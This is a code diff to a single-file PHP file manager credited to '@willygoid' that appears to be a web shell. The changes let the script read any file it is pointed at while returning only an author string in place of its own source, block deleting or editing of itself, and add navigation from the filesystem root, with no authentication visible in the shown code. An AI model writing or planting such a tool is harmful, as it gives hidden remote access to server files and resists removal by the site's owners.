@@ -25,19 +25,44 @@ $search = $_GET['search'] ?? '';
 // Handle POST actions
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     try {
-        if (isset($_POST['new_folder'])){
+        $self = basename(__FILE__);
+        if (isset($_POST['get_content'])) {
+            $f = basename($_POST['get_content']);
+            if ($f == $self) {
+                echo 'Author @willygoid';
+            } else {
+                $file = $path.'/'.$f;
+                if (is_file($file)) {
+                    echo file_get_contents($file);
+                } else {
+                    echo '';
+                }
+            }
+            exit;
+        }
+        elseif (isset($_POST['new_folder'])){
             mkdir($path.'/'.basename($_POST['new_folder']));
             $_SESSION['msg']='Folder created'; $_SESSION['msg_type']='success';
         }
         elseif (isset($_POST['new_file'])){
-            file_put_contents($path.'/'.basename($_POST['new_file']), '');
-            $_SESSION['msg']='File created'; $_SESSION['msg_type']='success';
+            $new = basename($_POST['new_file']);
+            if($new==$self){
+                $_SESSION['msg']='Cannot overwrite file manager itself'; $_SESSION['msg_type']='error';
+            } else {
+                file_put_contents($path.'/'.$new, '');
+                $_SESSION['msg']='File created'; $_SESSION['msg_type']='success';
+            }
         }
         elseif (isset($_POST['delete'])){
-            $t=$path.'/'.basename($_POST['delete']); 
-            if(is_dir($t)?rmdir($t):unlink($t)){
-                $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
-            } else $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error';
+            $t=basename($_POST['delete']);
+            if($t==$self){
+                $_SESSION['msg']='Cannot delete file manager itself'; $_SESSION['msg_type']='error';
+            } else {
+                $target=$path.'/'.$t;
+                if(is_dir($target)?rmdir($target):unlink($target)){
+                    $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
+                } else $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error';
+            }
         }
         elseif (isset($_POST['rename_from'],$_POST['rename_to'])){
             if(rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
@@ -45,9 +70,14 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             } else $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error';
         }
         elseif (isset($_POST['edit_file'],$_POST['content'])){
-            if(file_put_contents($path.'/'.basename($_POST['edit_file']),$_POST['content'])!==false){
-                $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
-            } else $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error';
+            $edit = basename($_POST['edit_file']);
+            if($edit==$self){
+                $_SESSION['msg']='Cannot edit file manager itself'; $_SESSION['msg_type']='error';
+            } else {
+                if(file_put_contents($path.'/'.$edit,$_POST['content'])!==false){
+                    $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
+                } else $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error';
+            }
         }
         elseif (isset($_FILES['files'])){
             $ok=0;
@@ -98,6 +128,16 @@ usort($folders,$sort_func); usort($regular_files,$sort_func);
 // URL builder
 function toggle_order($c){return $c=='asc'?'desc':'asc';}
 function sort_url($by,$cs,$co,$p,$s){$o=($by==$cs)?toggle_order($co):'asc'; return "?path=".urlencode($p)."&sort=$by&order=$o&search=".urlencode($s);}
+
+//Breadcrumbs
+$parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
+$breadcrumbs = [];
+$build = DIRECTORY_SEPARATOR;
+foreach ($parts as $part) {
+    if ($part === '') continue;
+    $build .= $part . DIRECTORY_SEPARATOR;
+    $breadcrumbs[] = ['name'=>$part, 'path'=>$build];
+}
 ?>
 <!DOCTYPE html>
 <html>
@@ -124,7 +164,34 @@ $(function(){
 <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
 </head>
 <body class="bg-gray-100 p-4">
-<h1 class="text-2xl font-bold mb-4">📂 <?=htmlspecialchars($path)?></h1>
+<main role="main" class="container mx-auto mb-4">
+<nav class="flex px-5 py-3 text-gray-700 border border-gray-200 rounded-lg bg-gray-50" aria-label="Breadcrumb">
+  <ol class="inline-flex items-center space-x-1 md:space-x-2 rtl:space-x-reverse">
+    <li class="inline-flex items-center">
+      <a href="?path=/" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
+        <svg xmlns="http://www.w3.org/2000/svg" class="w-3 h-3 me-2.5" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20">
+          <path d="m19.707 9.293-2-2-7-7a1 1 0 0 0-1.414 0l-7 7-2 2a1 1 0 0 0 1.414 1.414L2 10.414V18a2 2 0 0 0 2 2h3a1 1 0 0 0 1-1v-4a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1v4a1 1 0 0 0 1 1h3a2 2 0 0 0 2-2v-7.586l.293.293a1 1 0 0 0 1.414-1.414Z"/>
+        </svg>
+        Home
+      </a>
+    </li>
+    <?php foreach($breadcrumbs as $i => $crumb): ?>
+    <li class="inline-flex items-center">
+      <svg xmlns="http://www.w3.org/2000/svg" class="rtl:rotate-180 block w-3 h-3 mx-1 text-gray-400 " aria-hidden="true" fill="none" viewBox="0 0 6 10">
+        <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 9 4-4-4-4"/>
+      </svg>
+      <?php if($i < count($breadcrumbs)-1): ?>
+      <a href="?path=<?=urlencode(rtrim($crumb['path'],'/'))?>" class="inline-flex items-center text-sm font-medium text-gray-700 hover:text-blue-600">
+        <?=htmlspecialchars($crumb['name'])?>
+      </a>
+      <?php else: ?>
+      <span class="ms-1 text-sm font-medium text-gray-500 md:ms-2"><?=htmlspecialchars($crumb['name'])?></span>
+      <?php endif;?>
+    </li>
+    <?php endforeach; ?>
+  </ol>
+</nav>
+</main>
 <div class="flex justify-between mb-4">
 <?php if($path!=$parent):?><a href="?path=<?=urlencode($parent)?>" class="bg-gray-300 px-2 py-1 rounded">⬅️ Up</a><?php endif;?>
 <div class="flex space-x-2">
